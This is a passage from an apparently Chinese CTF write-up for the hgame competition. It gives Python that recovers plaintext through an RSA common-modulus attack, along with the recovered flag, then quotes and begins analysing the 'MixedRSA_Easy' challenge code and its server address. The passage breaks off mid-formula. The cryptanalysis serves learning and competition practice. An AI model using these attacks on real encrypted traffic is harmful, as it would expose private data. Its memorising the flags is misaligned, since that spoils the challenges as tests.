mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span></span></span></span></span></p><p>代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">e1 = <span class="number">0x33240</span></span><br><span class="line">e2 = <span class="number">0x3e4f</span></span><br><span class="line">n = </span><br><span class="line"><span class="number">0x9439682bf1b4ab48c43c524778c579cc844b60872275725c1dc893b5bcb358b9</span></span><br><span class="line">  f136e4dab2a06318bb0c80e202a14bc54ea334519bec023934e01e9378abf329</span><br><span class="line">  <span class="number">893</span>f3870979e9f2f2be8fff4df931216a77007a2509f49f697bf286285e97fac</span><br><span class="line">  <span class="number">5</span>dc6e4a164b5c2cc430887b18136437ba67777bda05aafdeaf918221c812b4c7</span><br><span class="line">  d1665238f84ab0fab7a77fcae92a0596e58343be7a8e6e75a5017c63a67eb119</span><br><span class="line">  <span class="number">64970659</span>cd6110e9ec6502288e9e443d86229ef2364dfecb63e2d90993a75356</span><br><span class="line">  <span class="number">854</span>eb874797340eece1b19974e86bee07019610467d44ec595e04af02b574a97</span><br><span class="line">  fa98bdb2e779871c804219cab715f4a80fef7f8fb52251d86077560b39c1c2a1</span><br><span class="line">message1 = </span><br><span class="line"><span class="number">0x7c7f315a3ebbe305c1ad8bd2f73b1bb8e300912b6b8ba1b331ac2419d3da5a9a</span></span><br><span class="line">  <span class="number">605</span>fd62915c11f8921c450525d2efda7d48f1e503041498f4f0676760b43c770</span><br><span class="line">  ff2968bd942c7ef95e401dd7facbd4e5404a0ed3ad96ae505f87c4e12439a2da</span><br><span class="line">  <span class="number">636</span>f047d84b1256c0e363f63373732cbaf24bda22d931d001dcca124f5a19f9e</span><br><span class="line">  <span class="number">28608</span>ebd90161e728b782eb67deeba4cc81b6df4e7ee29a156f51a0e5148618c</span><br><span class="line">  <span class="number">6e81</span>c31a91036c982debd1897e6f3c1e5e248789c933a4bf30d0721a18ab8708</span><br><span class="line">  d827858b77c1a020764550a7fe2ebd48b6848d9c4d211fd853b7a02a859fa0c7</span><br><span class="line">  <span class="number">2160675</span>d832c94e0e43355363a2166b3d41b8137100c18841e34ff52786867d</span><br><span class="line">message2 = </span><br><span class="line"><span class="number">0xf3a8b9b739196ba270c8896bd3806e9907fca2592d28385ef24afadc2a408b79</span></span><br><span class="line">  <span class="number">42214</span>dad5b9e14808ab988fb15fbd93e725edcc0509ab0dd1656557019ae93c3</span><br><span class="line">  <span class="number">8031</span>d2a7c84895ee3da1150eda04cd2815ee3debaa7c2651b62639f785f6cabf</span><br><span class="line">  <span class="number">83</span>f93bf3cce7778ab369631ea6145438c3cd4d93d6f2759be3cc187651a33b3c</span><br><span class="line">  c4c3b477604477143c32dfff62461fdfd9f8aa879257489bbf977417ce0fbe89</span><br><span class="line">  e3f2464475624aafef57dd9ea60339793c69b53ca71d745d626f45e6a7beb9fc</span><br><span class="line">  bd9d1a259433d36139345b7bb4f392e78f1b5be0d2c56ad50767ee851fac6709</span><br><span class="line">  <span class="number">46356</span>b3c05d0605bf243b89c7e683cc75030b71633632fb95c84075201352d6</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcdext</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x, y, q = gcdext(b, a % b)  <span class="comment"># q = gcd(a, b) = gcd(b, a%b)</span></span><br><span class="line">        x, y = y, (x - (a // b) * y)</span><br><span class="line">        <span class="keyword">return</span> x, y, q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> a != <span class="number">0</span>:</span><br><span class="line">        a, b = b % a, a</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findModReverse</span><span class="params">(a, m)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> gcd(a, m) != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    u1, u2, u3 = <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    v1, v2, v3 = <span class="number">0</span>, <span class="number">1</span>, m</span><br><span class="line">    <span class="keyword">while</span> v3 != <span class="number">0</span>:</span><br><span class="line">        q = u3 // v3</span><br><span class="line">        v1, v2, v3, u1, u2, u3 = (u1 - q * v1), (u2 - q * v2), (u3 - q * v3), v1, v2, v3</span><br><span class="line">    <span class="keyword">return</span> u1 % m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s, t, pp = gcdext(e1, e2)</span><br><span class="line">times = s * e1 + t * e2</span><br><span class="line"><span class="keyword">if</span> s &lt; <span class="number">0</span>:</span><br><span class="line">    s = -s</span><br><span class="line">    message1 = findModReverse(message1, n)</span><br><span class="line"><span class="keyword">if</span> t &lt; <span class="number">0</span>:</span><br><span class="line">    t = -t</span><br><span class="line">    message2 = findModReverse(message2, n)</span><br><span class="line">plain = (pow(message1, s, n) * pow(message2, t, n)) % n</span><br><span class="line">print(plain)</span><br><span class="line">print(pow(plain, <span class="number">1</span> / times))</span><br><span class="line"></span><br><span class="line">plain = <span class="number">211655262573966881062823795220179644607412162371069</span></span><br><span class="line">i = <span class="number">59594981651654789</span></span><br></pre></td></tr></table></figure><p>由于times=3，所以plain可以开三次方，得到59594981651654789</p><p>所以flag就是<code>hgame{59594981651654789}</code></p><p>（我也不知道为什么。。。）</p><h3 id="2-mixedrsa_easy"><a class="markdownIt-Anchor" href="#2-mixedrsa_easy"></a> 2. MixedRSA_Easy</h3><h4 id="question-4"><a class="markdownIt-Anchor" href="#question-4"></a> Question</h4><p>Description</p><p>47.95.212.185 38610<br />由CNSS友情赞助 比心</p><p>URL</p><p><a href="http://plqbnxx54.bkt.clouddn.com/MixedRSA_Easy.py" target="_blank" rel="noopener">http://plqbnxx54.bkt.clouddn.com/MixedRSA_Easy.py</a></p><p>Base Score</p><p>400</p><h4 id="answer-4"><a class="markdownIt-Anchor" href="#answer-4"></a> Answer</h4><p>（玩了这么久，总算拿了个二血，多了3%的分数加成，开心）</p><p>题目给的代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="keyword">from</span> signal <span class="keyword">import</span> alarm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">        a, b = b, a % b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ex_gcd</span><span class="params">(m, n)</span>:</span></span><br><span class="line">    x, y, x1, y1 = <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> m % n:</span><br><span class="line">        x, x1 = x1 - m // n * x, x</span><br><span class="line">        y, y1 = y1 - m // n * y, y</span><br><span class="line">        m, n = n, m % n</span><br><span class="line">    <span class="keyword">return</span> n, x, y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv</span><span class="params">(x, p)</span>:</span></span><br><span class="line">    g, y, k = ex_gcd(x, p)</span><br><span class="line">    <span class="keyword">if</span> y &lt; p:</span><br><span class="line">        y += p</span><br><span class="line">    <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> bytes(x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(a, b))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MixedRSA</span>:</span></span><br><span class="line">    n = e = d = iv = BLOCK = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, iv, block=<span class="number">256</span>)</span>:</span></span><br><span class="line">        self.BLOCK = block</span><br><span class="line">        p = getPrime(block * <span class="number">4</span>)</span><br><span class="line">        q = getPrime(block * <span class="number">4</span>)</span><br><span class="line">        self.n = p * q</span><br><span class="line">        phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">        self.e = getPrime(<span class="number">64</span>)</span><br><span class="line">        self.d = inv(self.e, phi)</span><br><span class="line">        iv *= block // len(iv)</span><br><span class="line">        self.iv = iv.rjust(block, <span class="string">b'\x00'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">padding</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">b'\x00'</span> * (-len(s) % self.BLOCK) + s</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">rsa_encrypt</span><span class="params">(self, m)</span>:</span></span><br><span class="line">        c = pow(int(m.hex(), <span class="number">16</span>), self.e, self.n)</span><br><span class="line">        c = hex(c)[<span class="number">2</span>:].rjust(self.BLOCK * <span class="number">2</span>, <span class="string">'0'</span>)</span><br><span class="line">        <span class="keyword">return</span> bytes.fromhex(c)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">rsa_decrypt</span><span class="params">(self, c)</span>:</span></span><br><span class="line">        m = pow(int(c.hex(), <span class="number">16</span>), self.d, self.n)</span><br><span class="line">        m = hex(m)[<span class="number">2</span>:].rjust(self.BLOCK * <span class="number">2</span>, <span class="string">'0'</span>)</span><br><span class="line">        <span class="keyword">return</span> bytes.fromhex(m)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(self, plaintext)</span>:</span></span><br><span class="line">        plaintext = self.padding(plaintext)</span><br><span class="line">        imd = self.iv</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(plaintext), self.BLOCK):</span><br><span class="line">            m = xor(imd[-self.BLOCK:], plaintext[i: i + self.BLOCK])</span><br><span class="line">            imd += self.rsa_encrypt(m)</span><br><span class="line">        imd = imd[self.BLOCK:]</span><br><span class="line">        cipher = self.iv</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(imd), self.BLOCK):</span><br><span class="line">            c = self.rsa_encrypt(cipher[-self.BLOCK:])</span><br><span class="line">            cipher += xor(c, imd[i: i + self.BLOCK])</span><br><span class="line">        <span class="keyword">return</span> cipher[self.BLOCK:]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(self, cipher)</span>:</span></span><br><span class="line">        cipher = self.iv + cipher</span><br><span class="line">        imd = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(self.BLOCK, len(cipher), self.BLOCK):</span><br><span class="line">            c = self.rsa_encrypt(cipher[i - self.BLOCK: i])</span><br><span class="line">            imd += xor(c, cipher[i: i + self.BLOCK])</span><br><span class="line">        imd = self.iv + imd</span><br><span class="line">        plaintext = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(self.BLOCK, len(imd), self.BLOCK):</span><br><span class="line">            m = self.rsa_decrypt(imd[i: i + self.BLOCK])</span><br><span class="line">            plaintext += xor(m, imd[i - self.BLOCK: i])</span><br><span class="line">        <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    alarm(<span class="number">60</span>)</span><br><span class="line">    mix = MixedRSA(FLAG)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        print(<span class="string">"Choose:\n[1] Encrypt (hex)\n[2] Decrypt (hex)"</span>)</span><br><span class="line">        op = input()</span><br><span class="line">        <span class="keyword">if</span> op == <span class="string">'1'</span>:</span><br><span class="line">            msg = bytes.fromhex(input())</span><br><span class="line">            print(mix.encrypt(msg).hex())</span><br><span class="line">        <span class="keyword">elif</span> op == <span class="string">'2'</span>:</span><br><span class="line">            msg = bytes.fromhex(input())</span><br><span class="line">            print(mix.decrypt(msg).hex())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'Bye'</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><hr /><p>首先要拿到<code>FLAG</code>，其实也就是要拿到mix里面的那个<code>iv</code>，因为根据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mix = MixedRSA(FLAG)</span><br></pre></td></tr></table></figure><p>以及</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, iv, block=<span class="number">256</span>)</span>:</span></span><br><span class="line">    ...</span><br><span class="line">iv *= block // len(iv)</span><br><span class="line">self.iv = iv.rjust(block, <span class="string">b'\x00'</span>)</span><br></pre></td></tr></table></figure><p>可以看出<code>iv</code>是由FLAG不断重复，然后左边补0产生的一个大小是256B的Bytes。</p><p>举个例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG = <span class="string">b'hgame&#123;...&#125;'</span></span><br></pre></td></tr></table></figure><p>那么就会得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">iv = <span class="string">'0000000000006867616d657b2e2e2e7d6867616d657b2e2e2e7d6867616d657b2e2e2e7d6867616d657b2e2e2e7d\</span></span><br><span class="line"><span class="string">                  6867616d657b2e2e2e7d6867616d657b2e2e2e7d6867616d657b2e2e2e7d6867616d657b2e2e2e7d\</span></span><br><span class="line"><span class="string">                  6867616d657b2e2e2e7d6867616d657b2e2e2e7d6867616d657b2e2e2e7d6867616d657b2e2e2e7d\</span></span><br><span class="line"><span class="string">                  6867616d657b2e2e2e7d6867616d657b2e2e2e7d6867616d657b2e2e2e7d6867616d657b2e2e2e7d\</span></span><br><span class="line"><span class="string">                  6867616d657b2e2e2e7d6867616d657b2e2e2e7d6867616d657b2e2e2e7d6867616d657b2e2e2e7d\</span></span><br><span class="line"><span class="string">                  6867616d657b2e2e2e7d6867616d657b2e2e2e7d6867616d657b2e2e2e7d6867616d657b2e2e2e7d\</span></span><br><span class="line"><span class="string">                  6867616d657b2e2e2e7d'</span></span><br></pre></td></tr></table></figure><p>很明显后面是以<code>6867616d657b2e2e2e7d</code>为重复的，其实也就是<code>hgame{...}</code>的ASCII的十六进制。</p><hr /><p>要拿到<code>iv</code>的话，主要要关心的其实就是<code>encrypt</code>和<code>decrypt</code>两个函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(self, plaintext)</span>:</span></span><br><span class="line">    plaintext = self.padding(plaintext)</span><br><span class="line">    imd = self.iv</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(plaintext), self.BLOCK):</span><br><span class="line">        m = xor(imd[-self.BLOCK:], plaintext[i: i + self.BLOCK])</span><br><span class="line">        imd += self.rsa_encrypt(m)</span><br><span class="line">    imd = imd[self.BLOCK:]</span><br><span class="line">    cipher = self.iv</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(imd), self.BLOCK):</span><br><span class="line">        c = self.rsa_encrypt(cipher[-self.BLOCK:])</span><br><span class="line">        cipher += xor(c, imd[i: i + self.BLOCK])</span><br><span class="line">    <span class="keyword">return</span> cipher[self.BLOCK:]</span><br></pre></td></tr></table></figure><p>这个看上去像是CBC，并且是256B为一个Block，如果假设这里的<code>plaintext</code>刚好就是256B的长度，那么这个函数就可以化简为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(self, plaintext)</span>:</span></span><br><span class="line"><span class="keyword">return</span> xor(self.rsa_encrypt(xor(self.iv, plaintext)),self.rsa_encrypt(self.iv))</span><br></pre></td></tr></table></figure><p>那么对于plaintext为256B（也就是一个Block）的时候，其实用数学符号写出来就是</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>e</mi><mi>n</mi><mi>c</mi><mi>r</mi><mi>y</mi><mi>p</mi><mi>t</mi><mo stretchy="false">(</mo><mi>p</mi><mi>l</mi><mi>a</mi><mi>i</mi><mi>n</mi><mi>t</mi><mi>e</mi><mi>x</mi><mi>t</mi><mo stretchy="false">)</mo><mo>=</mo><mi>R</mi><mi>S</mi><mi>A</mi><mo stretchy="false">(</mo><mi>p</mi><mi>l</mi><mi>a</mi><mi>i</mi><mi>n</mi><mi>t</mi><mi>e</mi><mi>x</mi><mi>t</mi><mo>⊕</mo><mi>i</mi><mi>v</mi><mo stretchy="false">)</mo><mo>⊕</mo><mi>R</mi><mi>S</mi><mi>A</mi><mo stretchy="false">(</mo><mi>i</mi><mi>v</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">encrypt(plaintext)=RSA(plaintext \oplus iv)\oplus RSA(iv)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">p</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">x</span><span class="mord mathdefault">t</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">A</span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">x</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">A</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mclose">)</span></span></span></span></span></p><blockquote><p>上面<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>R</mi><mi>S</mi><mi>A</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">RSA(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">A</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span></span></span></span>表示对<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">x</span></span></span></span>进行加密，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>R</mi><mi>S</mi><msup><mi>A</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">RSA^{-1}(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span></span></span></span>表示解密，下同</p></blockquote><p>那么同理，对于decrypt，当cipher刚好为256B的时候，可以得到</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mi>e</mi><mi>c</mi><mi>r</mi><mi>y</mi><mi>p</mi><mi>t</mi><mo stretchy="false">(</mo><mi>c</mi><mi>i</mi><mi>p</mi><mi>h</mi><mi>e</mi><mi>r</mi><mo stretchy="false">)</mo><mo>=</mo><mi>R</mi><mi>S</mi><msup><mi>A</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo stretchy="false">(</mo><mi>c</mi><mi>i</mi><mi>p</mi><mi>h</mi><mi>e</mi><mi>r</mi><mo>⊕</mo><mi>R</mi><mi>S</mi><mi>A</mi><mo stretchy="false">(</mo><mi>i</mi><mi>v</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>⊕</mo><mi>i</mi><mi>v</mi></mrow><annotation encoding="application/x-tex">decrypt(cipher)=RSA^{-1}(cipher \oplus RSA(iv))\oplus iv</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">p</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord mathdefault">c</span><span class="mord mathdefault">i</span><span class="mord mathdefault">p</span><span class="mord mathdefault">h</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord 